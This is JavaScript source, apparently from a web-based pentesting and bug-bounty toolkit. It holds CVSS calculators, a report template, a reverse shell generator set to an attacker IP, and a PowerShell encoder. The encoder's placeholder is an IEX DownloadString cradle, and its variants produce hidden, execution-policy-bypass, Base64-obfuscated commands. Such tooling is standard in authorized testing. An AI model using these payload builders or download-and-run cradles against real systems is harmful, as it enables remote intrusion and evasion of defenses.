  powerLow: `<svg viewBox="0 0 24 24"><circle cx="12" cy="13" r="8.5" fill="${PG}" stroke="${D}" stroke-width="1.6"/><path d="M12 5v6" fill="none" stroke="${D}" stroke-width="1.6" stroke-linecap="round"/><path d="M8.3 9a5 5 0 1 0 7.4 0" fill="none" stroke="${D}" stroke-width="1.6" stroke-linecap="round"/></svg>`,
};
const cvssOptToken = (key, val) => {
  const map = {
    AC: { L: 'bolt', H: 'puzzle' },
    AT: { N: 'ban', P: 'flag' },
    PR: { N: 'unlock', L: 'user', H: 'usershield' },
    UI: { N: 'ban', R: 'pointer', P: 'pointer', A: 'pointer' },
    S:  { U: 'box', C: 'boxshift' },
  }[key];
  if (map) return map[val] || '';
  const dim = { C: 'c', VC: 'c', SC: 'c', I: 'i', VI: 'i', SI: 'i', A: 'a', VA: 'a', SA: 'a' }[key];
  if (dim === 'c') return val === 'N' ? 'unlock' : val === 'L' ? 'lockLow' : 'lock';
  if (dim === 'i') return val === 'N' ? 'penciloff' : val === 'L' ? 'pencilLow' : 'pencil';
  if (dim === 'a') return val === 'N' ? 'poweroff' : val === 'L' ? 'powerLow' : 'power';
  return '';
};
const optIcon = (key, val) => {
  if (key === 'AV') return '<span class="cvico-wrap"><i class="cvico AV' + val + '"></i></span>';
  const t = cvssOptToken(key, val);
  return t && CVSS_SVG[t] ? '<span class="cvico-wrap cvico-svg">' + CVSS_SVG[t] + '</span>' : '';
};
const TT_ALIAS = { C: 'VC', I: 'VI', A: 'VA' };
const ttMetric = (k) => { const t = window.CVSS_TT || {}; return t[k] || t[TT_ALIAS[k]] || ''; };
const ttOption = (k, v) => { const t = window.CVSS_TT || {}; return t[k + ':' + v] || t[(TT_ALIAS[k] || k) + ':' + v] || ''; };
const readCvssHash = (ver, keys) => {
  const m = location.hash.match(new RegExp('CVSS:' + ver.replace('.', '\\.') + '/([^#?]*)'));
  const out = {};
  if (m) m[1].split('/').forEach(p => { const a = p.split(':'); if (a[0] && a[1] && keys.includes(a[0])) out[a[0]] = a[1]; });
  return out;
};
const writeCvssHash = (toolKey, ver, sel, order) => {
  const pairs = order.filter(k => sel[k]).map(k => k + ':' + sel[k]);
  history.replaceState(null, '', pairs.length ? ('#/' + toolKey + '/CVSS:' + ver + '/' + pairs.join('/')) : ('#/' + toolKey));
};

TOOLS['3.1'] = {
  title: 'CVSS 3.1 Calculator',
  desc: 'Calculate Common Vulnerability Scoring System 3.1 base score',
  render() {
    const renderMetric = (key) => {
      const m = CVSS31_METRICS[key];
      return `
        <div class="metric">
          <div class="metric-label" data-tip="${escapeHtml(ttMetric(key))}">${m.name} (${key})</div>
          <div class="metric-options" data-key="${key}">
            ${m.opts.map(([v, l]) => `<button class="metric-btn" data-val="${v}" data-tip="${escapeHtml(ttOption(key, v))}">${optIcon(key, v)}${l}</button>`).join('')}
          </div>
        </div>
      `;
    };
    return `
      <div class="tool">
        <div class="cvss-grid">
          <div class="card">
            <div class="metric-group">
              <h4>Base Metrics</h4>
              ${['AV','AC','PR','UI','S','C','I','A'].map(renderMetric).join('')}
            </div>
            <button class="btn btn-secondary" id="cvss31-reset">Reset</button>
          </div>
          <div class="card" style="position:sticky;top:0">
            <div class="card-title">Score</div>
            <div class="cvss-score" id="cvss31-score">0.0</div>
            <div style="text-align:center;margin-bottom:14px"><span class="severity-badge sev-none" id="cvss31-sev">None</span></div>
            <div class="cvss-vector" id="cvss31-vector">CVSS:3.1/...</div>
            <div class="btn-row" style="margin-top:12px">
              <button class="btn btn-secondary" id="cvss31-copy-vec">Copy Vector</button>
              <button class="btn btn-secondary" id="cvss31-copy-score">Copy Score</button>
            </div>
          </div>
        </div>
      </div>
    `;
  },
  init() {
    const sel = {};
    const update = () => {
      const score = calcCVSS31(sel);
      const [cls, label] = severityFromScore(score);
      const scoreEl = $('#cvss31-score');
      scoreEl.textContent = score == null ? '-' : score.toFixed(1);
      scoreEl.style.color = SEV_COLOR[cls] || 'var(--text-mute)';
      const sev = $('#cvss31-sev');
      sev.className = `severity-badge sev-${cls}`;
      sev.textContent = label;
      const order = ['AV','AC','PR','UI','S','C','I','A'];
      const v = 'CVSS:3.1/' + order.map(k => `${k}:${sel[k] || '?'}`).join('/');
      $('#cvss31-vector').textContent = v;
      writeCvssHash('3.1', '3.1', sel, order);
    };
    $$('.metric-options').forEach(group => {
      const key = group.dataset.key;
      group.addEventListener('click', e => {
        if (!e.target.matches('.metric-btn')) return;
        sel[key] = e.target.dataset.val;
        $$('.metric-btn', group).forEach(b => b.classList.toggle('active', b === e.target));
        update();
      });
    });
    $('#cvss31-reset').addEventListener('click', () => {
      Object.keys(sel).forEach(k => delete sel[k]);
      $$('.metric-btn').forEach(b => b.classList.remove('active'));
      update();
    });
    $('#cvss31-copy-vec').addEventListener('click', () => copy($('#cvss31-vector').textContent));
    $('#cvss31-copy-score').addEventListener('click', () => copy($('#cvss31-score').textContent));
    const preOrder = ['AV','AC','PR','UI','S','C','I','A'];
    Object.assign(sel, readCvssHash('3.1', preOrder));
    $$('.metric-options').forEach(group => { const k = group.dataset.key; const btn = sel[k] && $(`.metric-btn[data-val="${sel[k]}"]`, group); if (btn) btn.classList.add('active'); });
    update();
  }
};

// ===== CVSS 4.0 CALCULATOR (simplified) =====
const CVSS40_METRICS = {
  AV: { name: 'Attack Vector', opts: [['N','Network'],['A','Adjacent'],['L','Local'],['P','Physical']] },
  AC: { name: 'Attack Complexity', opts: [['L','Low'],['H','High']] },
  AT: { name: 'Attack Requirements', opts: [['N','None'],['P','Present']] },
  PR: { name: 'Privileges Required', opts: [['N','None'],['L','Low'],['H','High']] },
  UI: { name: 'User Interaction', opts: [['N','None'],['P','Passive'],['A','Active']] },
  VC: { name: 'Vulnerable Confidentiality', opts: [['H','High'],['L','Low'],['N','None']] },
  VI: { name: 'Vulnerable Integrity', opts: [['H','High'],['L','Low'],['N','None']] },
  VA: { name: 'Vulnerable Availability', opts: [['H','High'],['L','Low'],['N','None']] },
  SC: { name: 'Subsequent Confidentiality', opts: [['H','High'],['L','Low'],['N','None']] },
  SI: { name: 'Subsequent Integrity', opts: [['H','High'],['L','Low'],['N','None']] },
  SA: { name: 'Subsequent Availability', opts: [['H','High'],['L','Low'],['N','None']] },
};

// CVSS 4.0 — official FIRST.org base scoring (bundled in cvss4.js from FIRSTdotorg/cvss-v4-calculator)
const calcCVSS40 = (sel) => (window.calcCVSS40Official ? window.calcCVSS40Official(sel) : null);

TOOLS['4.0'] = {
  title: 'CVSS 4.0 Calculator',
  desc: 'Calculate Common Vulnerability Scoring System 4.0 base metrics',
  render() {
    const renderMetric = (key) => {
      const m = CVSS40_METRICS[key];
      return `
        <div class="metric">
          <div class="metric-label" data-tip="${escapeHtml(ttMetric(key))}">${m.name} (${key})</div>
          <div class="metric-options" data-key="${key}">
            ${m.opts.map(([v, l]) => `<button class="metric-btn" data-val="${v}" data-tip="${escapeHtml(ttOption(key, v))}">${optIcon(key, v)}${l}</button>`).join('')}
          </div>
        </div>
      `;
    };
    return `
      <div class="tool">
        <div class="cvss-grid">
          <div class="card">
            <div class="metric-group">
              <h4>Exploitability</h4>
              ${['AV','AC','AT','PR','UI'].map(renderMetric).join('')}
            </div>
            <div class="metric-group">
              <h4>Vulnerable System Impact</h4>
              ${['VC','VI','VA'].map(renderMetric).join('')}
            </div>
            <div class="metric-group">
              <h4>Subsequent System Impact</h4>
              ${['SC','SI','SA'].map(renderMetric).join('')}
            </div>
            <button class="btn btn-secondary" id="cvss40-reset">Reset</button>
          </div>
          <div class="card" style="position:sticky;top:0">
            <div class="card-title">Score</div>
            <div class="cvss-score" id="cvss40-score">0.0</div>
            <div style="text-align:center;margin-bottom:14px"><span class="severity-badge sev-none" id="cvss40-sev">None</span></div>
            <div class="cvss-vector" id="cvss40-vector">CVSS:4.0/...</div>
            <div class="btn-row" style="margin-top:12px">
              <button class="btn btn-secondary" id="cvss40-copy-vec">Copy Vector</button>
              <button class="btn btn-secondary" id="cvss40-copy-score">Copy Score</button>
            </div>
          </div>
        </div>
      </div>
    `;
  },
  init() {
    const sel = {};
    const update = () => {
      const score = calcCVSS40(sel);
      const [cls, label] = severityFromScore(score);
      const scoreEl = $('#cvss40-score');
      scoreEl.textContent = score == null ? '-' : score.toFixed(1);
      scoreEl.style.color = SEV_COLOR[cls] || 'var(--text-mute)';
      const sev = $('#cvss40-sev');
      sev.className = `severity-badge sev-${cls}`;
      sev.textContent = label;
      const order = ['AV','AC','AT','PR','UI','VC','VI','VA','SC','SI','SA'];
      const v = 'CVSS:4.0/' + order.map(k => `${k}:${sel[k] || '?'}`).join('/');
      $('#cvss40-vector').textContent = v;
      writeCvssHash('4.0', '4.0', sel, order);
    };
    $$('.metric-options').forEach(group => {
      const key = group.dataset.key;
      group.addEventListener('click', e => {
        if (!e.target.matches('.metric-btn')) return;
        sel[key] = e.target.dataset.val;
        $$('.metric-btn', group).forEach(b => b.classList.toggle('active', b === e.target));
        update();
      });
    });
    $('#cvss40-reset').addEventListener('click', () => {
      Object.keys(sel).forEach(k => delete sel[k]);
      $$('.metric-btn').forEach(b => b.classList.remove('active'));
      update();
    });
    $('#cvss40-copy-vec').addEventListener('click', () => copy($('#cvss40-vector').textContent));
    $('#cvss40-copy-score').addEventListener('click', () => copy($('#cvss40-score').textContent));
    const preOrder = ['AV','AC','AT','PR','UI','VC','VI','VA','SC','SI','SA'];
    Object.assign(sel, readCvssHash('4.0', preOrder));
    $$('.metric-options').forEach(group => { const k = group.dataset.key; const btn = sel[k] && $(`.metric-btn[data-val="${sel[k]}"]`, group); if (btn) btn.classList.add('active'); });
    update();
  }
};

// ===== REPORT TEMPLATE =====
const VULN_TYPES = [
  'Cross-Site Scripting (XSS)',
  'SQL Injection',
  'Cross-Site Request Forgery (CSRF)',
  'Insecure Direct Object Reference (IDOR)',
  'Server-Side Request Forgery (SSRF)',
  'Remote Code Execution (RCE)',
  'Local File Inclusion (LFI)',
  'Remote File Inclusion (RFI)',
  'XML External Entity (XXE)',
  'Open Redirect',
  'Account Takeover (ATO)',
  'Authentication Bypass',
  'Authorization Bypass / Privilege Escalation',
  'Information Disclosure',
  'Sensitive Data Exposure',
  'Subdomain Takeover',
  'Clickjacking',
  'Race Condition',
  'Business Logic Flaw',
  'Denial of Service (DoS)',
  'Improper Input Validation',
  'Broken Access Control',
  'Insecure Deserialization',
  'Server-Side Template Injection (SSTI)',
  'Command Injection',
  'Path Traversal',
  'CRLF Injection',
  'HTTP Request Smuggling',
  'Cache Poisoning',
  'CORS Misconfiguration',
  'JWT Vulnerability',
  'GraphQL Vulnerability',
  'Web3 / Smart Contract Issue',
];

TOOLS['report-template'] = {
  title: 'Report Template',
  desc: 'Generate a structured bug bounty report',
  render() {
    return `
      <div class="tool">
        <div class="card">
          <div class="card-title">Vulnerability Details</div>
          <div class="field">
            <label>Vulnerability Name</label>
            <input type="text" id="rt-name" placeholder="e.g. Stored XSS in user profile bio">
          </div>
          <div class="field">
            <label>Vulnerability Type</label>
            <input type="text" id="rt-type" list="rt-type-list" placeholder="Select or type a vulnerability type" autocomplete="off">
            <datalist id="rt-type-list">${VULN_TYPES.map(t => `<option value="${escapeHtml(t)}"></option>`).join('')}</datalist>
          </div>
          <div class="rt-cvss-row">
            <div class="field">
              <label>CVSS Ver.</label>
              <select id="rt-cvssver">
                <option value="3.1">CVSS 3.1</option>
                <option value="4.0">CVSS 4.0</option>
              </select>
            </div>
            <div class="field">
              <label>CVSS Vector</label>
              <input type="text" id="rt-vector" placeholder="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H">
            </div>
            <div class="field">
              <label>Score</label>
              <div class="rt-out-box"><span class="rt-score" id="rt-score">—</span></div>
            </div>
            <div class="field">
              <label>Severity</label>
              <div class="rt-out-box"><span class="severity-badge sev-none" id="rt-sevbadge">—</span></div>
            </div>
          </div>
          <div class="field">
            <label>Affected URL(s)</label>
            <div id="rt-urls">
              <div class="rt-url-row">
                <input type="text" class="rt-url" placeholder="https://target.com/affected/endpoint">
                <button type="button" class="rt-url-rm" title="Remove">&times;</button>
              </div>
            </div>
            <button type="button" class="btn btn-secondary rt-url-add" id="rt-url-add">+ Add URL</button>
          </div>
          <div class="field">
            <label>Description</label>
            <textarea id="rt-desc" rows="4" placeholder="Describe the vulnerability..."></textarea>
          </div>
          <div class="field">
            <label>Impact</label>
            <textarea id="rt-impact" rows="4" placeholder="Describe the impact and risk..."></textarea>
          </div>
          <div class="field">
            <label>Remediation</label>
            <textarea id="rt-rem" rows="3" placeholder="How to fix..."></textarea>
          </div>
          <div class="field">
            <label>References</label>
            <div id="rt-refs">
              <div class="rt-url-row">
                <input type="text" class="rt-ref" placeholder="OWASP / CWE / CVE link...">
                <button type="button" class="rt-url-rm" title="Remove">&times;</button>
              </div>
            </div>
            <button type="button" class="btn btn-secondary rt-url-add" id="rt-ref-add">+ Add Reference</button>
          </div>
          <div class="field">
            <label>Proof of Concept</label>
            <textarea id="rt-poc" rows="6" placeholder="Step 1...&#10;Step 2...&#10;Request/Payload..."></textarea>
          </div>
          <div class="btn-row">
            <button class="btn" id="rt-gen">Generate Report</button>
            <button class="btn btn-secondary" id="rt-clear">Clear</button>
          </div>
        </div>
        <div class="card" id="rt-results" style="display:none">
          <div class="result-header">
            <h4>Report (Markdown)</h4>
            <div>
              <button class="btn btn-ghost" id="rt-copy">Copy</button>
              <button class="btn btn-ghost" id="rt-dl">Download .md</button>
            </div>
          </div>
          <div class="result-box" id="rt-output"></div>
        </div>
      </div>
    `;
  },
  init() {
    const computeCvss = () => {
      const raw = $('#rt-vector').value.trim();
      const vm = raw.match(/CVSS:(3\.1|3\.0|4\.0)/i);
      if (vm) $('#rt-cvssver').value = vm[1].charAt(0) === '4' ? '4.0' : '3.1';
      const ver = $('#rt-cvssver').value;
      const sel = {};
      raw.replace(/^CVSS:[0-9.]+\//i, '').split('/').forEach(p => { const a = p.split(':'); if (a[0] && a[1]) sel[a[0].trim().toUpperCase()] = a[1].trim().toUpperCase(); });
      const score = ver === '4.0' ? calcCVSS40(sel) : calcCVSS31(sel);
      const scoreEl = $('#rt-score'), badge = $('#rt-sevbadge');
      if (score == null || isNaN(score)) { scoreEl.textContent = '—'; scoreEl.style.color = 'var(--text-mute)'; badge.className = 'severity-badge sev-none'; badge.textContent = '—'; return; }
      const [cls, label] = severityFromScore(score);
      scoreEl.textContent = score.toFixed(1);
      scoreEl.style.color = SEV_COLOR[cls] || 'var(--text-mute)';
      badge.className = 'severity-badge sev-' + cls;
      badge.textContent = label;
    };
    $('#rt-vector').addEventListener('input', computeCvss);
    $('#rt-cvssver').addEventListener('change', computeCvss);

    // Affected URL(s) + References: dynamic add/remove rows
    const wireRm = (btn) => btn.addEventListener('click', () => {
      const row = btn.closest('.rt-url-row'), box = row.parentElement;
      if (box.children.length > 1) row.remove(); else row.querySelector('input').value = '';
    });
    const addRow = (box, cls, ph) => {
      const row = document.createElement('div');
      row.className = 'rt-url-row';
      row.innerHTML = '<input type="text" class="' + cls + '" placeholder="' + ph + '"><button type="button" class="rt-url-rm" title="Remove">&times;</button>';
      box.appendChild(row);
      wireRm(row.querySelector('.rt-url-rm'));
      row.querySelector('input').focus();
    };
    $$('.rt-url-rm').forEach(wireRm);
    $('#rt-url-add').addEventListener('click', () => addRow($('#rt-urls'), 'rt-url', 'https://target.com/affected/endpoint'));
    $('#rt-ref-add').addEventListener('click', () => addRow($('#rt-refs'), 'rt-ref', 'OWASP / CWE / CVE link...'));

    $('#rt-gen').addEventListener('click', () => {
      const score = $('#rt-score').textContent;
      const severity = $('#rt-sevbadge').textContent;
      const ver = $('#rt-cvssver').value;
      const vector = $('#rt-vector').value.trim();
      const sevLine = (severity && severity !== '—') ? `${severity}${score !== '—' ? ` — CVSS ${ver} ${score}` : ''}` : 'N/A';
      const multi = (cls) => { const a = $$(cls).map(i => i.value.trim()).filter(Boolean); return a.length === 0 ? 'N/A' : a.length === 1 ? a[0] : a.map(x => '- ' + x).join('\n'); };
      const urlOut = multi('.rt-url');
      const refOut = multi('.rt-ref');
      const fields = {
        name: $('#rt-name').value,
        type: $('#rt-type').value,
        desc: $('#rt-desc').value,
        impact: $('#rt-impact').value,
        rem: $('#rt-rem').value,
        poc: $('#rt-poc').value,
      };
      const md = `# ${fields.name || 'Vulnerability Report'}

## Vulnerability Name
${fields.name}

## Vulnerability Type
${fields.type}

## Severity
${sevLine}

## CVSS Vector
${vector ? '`' + vector + '`' : 'N/A'}

## Affected URL
${urlOut}

## Description
${fields.desc}

## Impact
${fields.impact}

## Remediation
${fields.rem}

## References
${refOut}

## Proof of Concept
${fields.poc}
`;
      $('#rt-output').textContent = md;
      $('#rt-results').style.display = 'block';
    });
    $('#rt-clear').addEventListener('click', () => {
      ['rt-name','rt-vector','rt-desc','rt-impact','rt-rem','rt-poc'].forEach(id => $(`#${id}`).value = '');
      ['#rt-urls','#rt-refs'].forEach(sel => { const box = $(sel); Array.from(box.children).slice(1).forEach(r => r.remove()); box.querySelector('input').value = ''; });
      $('#rt-score').textContent = '—';
      $('#rt-sevbadge').className = 'severity-badge sev-none';
      $('#rt-sevbadge').textContent = '—';
    });
    $('#rt-copy').addEventListener('click', () => copy($('#rt-output').textContent));
    $('#rt-dl').addEventListener('click', () => {
      const name = ($('#rt-name').value || 'report').toLowerCase().replace(/[^a-z0-9]+/g, '-');
      download(`${name}.md`, $('#rt-output').textContent, 'text/markdown');
    });
  }
};

// ===== NOTATIONER (code naming-convention converter) =====
TOOLS['notationer'] = {
  title: 'Notationer',
  desc: 'Convert identifiers between naming conventions — camelCase, snake_case, kebab-case, and more',
  render() {
    return `
      <div class="tool">
        <div class="card">
          <div class="card-title">Input</div>
          <div class="field">
            <div class="not-label-row">
              <label>One identifier or phrase per line</label>
              <button type="button" class="btn btn-ghost" id="not-example">Generate example</button>
            </div>
            <textarea id="not-in" placeholder="userProfileId\nmax retry count\nHTTP-Response-Code"></textarea>
          </div>
        </div>
        <div id="not-out"></div>
      </div>
    `;
  },
  init() {
    const cap = s => s ? s.charAt(0).toUpperCase() + s.slice(1) : s;
    const up = s => s.toUpperCase();
    const toWords = s => s
      .replace(/([a-z0-9])([A-Z])/g, '$1 $2')
      .replace(/([A-Z]+)([A-Z][a-z])/g, '$1 $2')
      .replace(/[_\-.\/\\\s]+/g, ' ')
      .trim().toLowerCase().split(/\s+/).filter(Boolean);
    const FORMATS = [
      ['camelCase',            w => w.map((x, i) => i ? cap(x) : x).join('')],
      ['PascalCase',           w => w.map(cap).join('')],
      ['snake_case',           w => w.join('_')],
      ['SCREAMING_SNAKE_CASE', w => w.map(up).join('_')],
      ['kebab-case',           w => w.join('-')],
      ['Train-Case',           w => w.map(cap).join('-')],
      ['dot.case',             w => w.join('.')],
      ['path/case',            w => w.join('/')],
      ['Title Case',           w => w.map(cap).join(' ')],
      ['Sentence case',        w => w.length ? cap(w[0]) + (w.length > 1 ? ' ' + w.slice(1).join(' ') : '') : ''],
      ['lower case',           w => w.join(' ')],
      ['UPPER CASE',           w => w.map(up).join(' ')],
      ['nospacelower',         w => w.join('')],
      ['NOSPACEUPPER',         w => w.map(up).join('')],
    ];
    const out = $('#not-out');
    let cur = 0;
    const render = () => {
      const lines = $('#not-in').value.split('\n').map(l => l.trim()).filter(Boolean);
      if (!lines.length) { out.innerHTML = ''; return; }
      const words = lines.map(toWords);
      out.innerHTML = `
        <div class="card">
          <div class="not-formats">${FORMATS.map(([name], i) => `<button class="not-fmt" data-i="${i}">${escapeHtml(name)}</button>`).join('')}</div>
          <div class="result-header"><h4 class="not-fmt-title"></h4><button class="btn btn-ghost" id="not-copy">Copy</button></div>
          <pre class="not-pre mono" id="not-result"></pre>
        </div>`;
      const show = (i) => {
        cur = i;
        const [name, fn] = FORMATS[i];
        const conv = words.map(fn);
        $('#not-result', out).textContent = conv.join('\n');
        $('.not-fmt-title', out).textContent = name;
        $$('.not-fmt', out).forEach((b, j) => b.classList.toggle('active', j === i));
      };
      $$('.not-fmt', out).forEach(b => b.addEventListener('click', () => show(+b.dataset.i)));
      $('#not-copy', out).addEventListener('click', () => copy($('#not-result', out).textContent));
      show(Math.min(cur, FORMATS.length - 1));
    };
    $('#not-in').addEventListener('input', render);
    $('#not-example').addEventListener('click', () => {
      $('#not-in').value = ['userProfileId', 'max retry count', 'HTTP-Response-Code', 'is_admin_user', 'API_KEY_SECRET'].join('\n');
      render();
    });
    render();
  }
};

// ===== REVERSE SHELL GENERATOR (data bundled from 0dayCTF/reverse-shell-generator) =====
const RSG_TYPES = [['ReverseShell', 'Reverse'], ['BindShell', 'Bind'], ['MSFVenom', 'MSFVenom'], ['HoaxShell', 'HoaxShell']];
TOOLS['revshell'] = {
  title: 'Reverse Shell Generator',
  desc: 'Reverse / bind / MSFVenom / HoaxShell payloads with encoding + listeners (revshells-style)',
  render() {
    const D = window.rsgData || { shells: [], listenerCommands: [] };
    const shells = D.shells || [];
    return `
      <div class="tool">
        <div class="rsg-top">
          <div class="card rsg-conn">
            <div class="card-title">Connection</div>
            <div class="rsg-conn-fields">
              <div class="field"><label>IP / Interface</label><input type="text" id="rsg-ip" value="10.10.14.1"></div>
              <div class="field"><label>Port</label><input type="text" id="rsg-port" value="9001"></div>
            </div>
          </div>
          <div class="card">
            <div class="card-title">Listener</div>
            <div class="rsg-listener-row">
              <div class="field"><label>Listener</label><select id="rsg-listener">${(D.listenerCommands || []).map((l, i) => `<option value="${i}">${escapeHtml(l[0])}</option>`).join('')}</select></div>
              <div class="rsg-outwrap">
                <div class="result-header"><h4>Command</h4><button class="btn btn-ghost" id="rsg-lcopy">Copy</button></div>
                <pre class="not-pre mono" id="rsg-lout"></pre>
              </div>
            </div>
          </div>
        </div>
        <div class="card">
          <div class="card-title">Payload</div>
          <div class="rsg-cfg">
            <div class="field"><label>Shell</label><select id="rsg-shell">${shells.map(s => `<option${s === 'bash' ? ' selected' : ''}>${s}</option>`).join('')}</select></div>
            <div class="field"><label>Encoding</label><select id="rsg-enc"><option value="none">None</option><option value="b64">Base64</option><option value="url">URL Encode</option><option value="url2">Double URL</option></select></div>
            <div class="field"><label>OS</label><select id="rsg-os"><option value="all">All</option><option value="linux">Linux</option><option value="windows">Windows</option><option value="mac">Mac</option></select></div>
          </div>
          <div class="rsg-tabs" id="rsg-tabs">${RSG_TYPES.map((t, i) => `<button class="rsg-tab${i === 0 ? ' active' : ''}" data-type="${t[0]}">${t[1]}</button>`).join('')}</div>
          <input type="text" id="rsg-search" placeholder="Filter payloads..." autocomplete="off" style="margin:10px 0 16px">
          <div class="rsg-grid">
            <div class="rsg-list" id="rsg-list"></div>
            <div class="rsg-outwrap">
              <div class="result-header"><h4 id="rsg-name">—</h4><button class="btn btn-ghost" id="rsg-copy">Copy</button></div>
              <pre class="not-pre mono" id="rsg-out"></pre>
            </div>
          </div>
        </div>
      </div>`;
  },
  init() {
    const D = window.rsgData;
    if (!D) { $('#rsg-out').textContent = 'Reverse-shell data failed to load.'; return; }
    const fixUrl = s => encodeURIComponent(s).replace(/[!'()*]/g, c => '%' + c.charCodeAt(0).toString(16).toUpperCase());
    const b64 = s => { try { return btoa(unescape(encodeURIComponent(s))); } catch (e) { return btoa(s); } };
    const subst = (cmd) => {
      const ip = $('#rsg-ip').value.trim() || 'IP';
      const port = $('#rsg-port').value.trim() || 'PORT';
      const shell = $('#rsg-shell').value;
      return cmd.replace(/\{ip\}/g, ip).replace(/\{port\}/g, port).replace(/\{shell\}/g, shell);
    };
    const encode = (cmd) => {
      const c = subst(cmd), mode = $('#rsg-enc').value;
      if (mode === 'b64') return b64(c);
      if (mode === 'url') return fixUrl(c);
      if (mode === 'url2') return fixUrl(fixUrl(c));
      return c;
    };
    let activeType = 'ReverseShell', selected = null;
    const listEl = $('#rsg-list');
    const matches = () => {
      const os = $('#rsg-os').value, q = $('#rsg-search').value.trim().toLowerCase();
      return D.reverseShellCommands.filter(it => it.meta.includes(activeType)
        && (os === 'all' || it.meta.includes(os))
        && (!q || it.name.toLowerCase().includes(q)));
    };
    const renderOut = () => {
      if (!selected) { $('#rsg-name').textContent = '—'; $('#rsg-out').textContent = ''; return; }
      $('#rsg-name').textContent = selected.name;
      $('#rsg-out').textContent = encode(selected.command);
    };
    const renderList = () => {
      const items = matches();
      if (items.length) selected = (selected && items.find(x => x.name === selected.name)) || items[0];
      else selected = null;
      listEl.innerHTML = items.length
        ? items.map((it, i) => `<button class="rsg-item${selected && it.name === selected.name ? ' active' : ''}" data-i="${i}">${escapeHtml(it.name)}</button>`).join('')
        : '<div class="rsg-empty">No payloads match.</div>';
      $$('.rsg-item', listEl).forEach((b, i) => b.addEventListener('click', () => {
        selected = items[i];
        $$('.rsg-item', listEl).forEach(x => x.classList.remove('active'));
        b.classList.add('active');
        renderOut();
      }));
      renderOut();
    };
    const renderListener = () => {
      const l = D.listenerCommands[+$('#rsg-listener').value];
      const ip = $('#rsg-ip').value.trim() || 'IP', port = $('#rsg-port').value.trim() || 'PORT';
      $('#rsg-lout').textContent = l[1].replace(/\{ip\}/g, ip).replace(/\{port\}/g, port);
    };
    $$('.rsg-tab').forEach(t => t.addEventListener('click', () => {
      activeType = t.dataset.type;
      $$('.rsg-tab').forEach(x => x.classList.toggle('active', x === t));
      selected = null;
      renderList();
    }));
    $('#rsg-ip').addEventListener('input', () => { renderOut(); renderListener(); });
    $('#rsg-port').addEventListener('input', () => { renderOut(); renderListener(); });
    $('#rsg-shell').addEventListener('change', renderOut);
    $('#rsg-enc').addEventListener('change', renderOut);
    $('#rsg-os').addEventListener('change', renderList);
    $('#rsg-search').addEventListener('input', renderList);
    $('#rsg-listener').addEventListener('change', renderListener);
    $('#rsg-copy').addEventListener('click', () => copy($('#rsg-out').textContent));
    $('#rsg-lcopy').addEventListener('click', () => copy($('#rsg-lout').textContent));
    renderList();
    renderListener();
  }
};

// ===== POWERSHELL ENCODER (-EncodedCommand, Base64 UTF-16LE) =====
TOOLS['ps-encode'] = {
  title: 'PowerShell Encoder',
  desc: 'Encode a PowerShell command into multiple execution / obfuscation variants',
  render() {
    return `
      <div class="tool">
        <div class="card">
          <div class="card-title">PowerShell Command</div>
          <div class="field">
            <label>Command to encode</label>
            <textarea id="pe-in" placeholder="IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.1/s.ps1')"></textarea>
          </div>
        </div>
        <div id="pe-out"></div>
      </div>`;
  },
  init() {
    const u16 = (s) => { let b = ''; for (let i = 0; i < s.length; i++) { const c = s.charCodeAt(i); b += String.fromCharCode(c & 0xff) + String.fromCharCode((c >> 8) & 0xff); } return btoa(b); };
    const u8 = (s) => { try { return btoa(unescape(encodeURIComponent(s))); } catch (e) { return btoa(s); } };
    const VARIANTS = [
      ['EncodedCommand (Base64 UTF-16LE)', c => u16(c)],
      ['Full: powershell -EncodedCommand', c => 'powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc ' + u16(c)],
      ['Base64 (UTF-8)', c => u8(c)],
      ['IEX FromBase64 (Unicode)', c => `powershell -nop -c "IEX([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('${u16(c)}')))"`],
      ['IEX FromBase64 (UTF-8)', c => `powershell -nop -c "IEX([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('${u8(c)}')))"`],
      ['Char array (IEX)', c => 'powershell -nop -c "IEX(([char[]](' + [...c].map(ch => ch.charCodeAt(0)).join(',') + ') -join \'\'))"'],
      ['cmd /c (encoded)', c => 'cmd.exe /c powershell.exe -NoP -W Hidden -Enc ' + u16(c)],
    ];
    const out = $('#pe-out');
    let cur = 0;
    const render = () => {
      const cmd = $('#pe-in').value;
      if (!cmd) { out.innerHTML = ''; return; }
      out.innerHTML = `
        <div class="card">
          <div class="not-formats">${VARIANTS.map(([n], i) => `<button class="not-fmt" data-i="${i}">${escapeHtml(n)}</button>`).join('')}</div>
          <div class="result-header"><h4 class="not-fmt-title"></h4><button class="btn btn-ghost" id="pe-copy">Copy</button></div>
          <pre class="not-pre mono" id="pe-result"></pre>
        </div>`;
      const show = (i) => {
        cur = i;
        $('#pe-result', out).textContent = VARIANTS[i][1](cmd);
        $('.not-fmt-title', out).textContent = VARIANTS[i][0];
        $$('.not-fmt', out).forEach((b, j) => b.classList.toggle('active', j === i));
      };
      $$('.not-fmt', out).forEach(b => b.addEventListener('click', () => show(+b.dataset.i)));
      $('#pe-copy', out).addEventListener('click', () => copy($('#pe-result', out).textContent));
      show(Math.min(cur, VARIANTS.length - 1));
    };
    $('#pe-in').addEventListener('input', render);
    render();
  }
};

// ============================================================
// NAVIGATION
// ============================================================
const loadTool = (key) => {
  const tool = TOOLS[key];
  if (!tool) return;
  $('#currentToolTitle').textContent = tool.title;
  $('#currentToolDesc').textContent = tool.desc;
  $('#content').innerHTML = tool.render();
  if (tool.init) tool.init();
  $$('.nav-item').forEach(n => n.classList.toggle('active', n.dataset.tool === key));
  localStorage.setItem('lastTool', key);
};

const initNav = () => {
  $$('.nav-item').forEach(n => {
    n.addEventListener('click', () => loadTool(n.dataset.tool));
  });
};

// ============================================================
// INIT
// ============================================================
document.addEventListener('DOMContentLoaded', () => {
  initNav();
  window._toast = toast;
  const last = localStorage.getItem('lastTool');
  loadTool(last && TOOLS[last] ? last : 'google-dork');
});
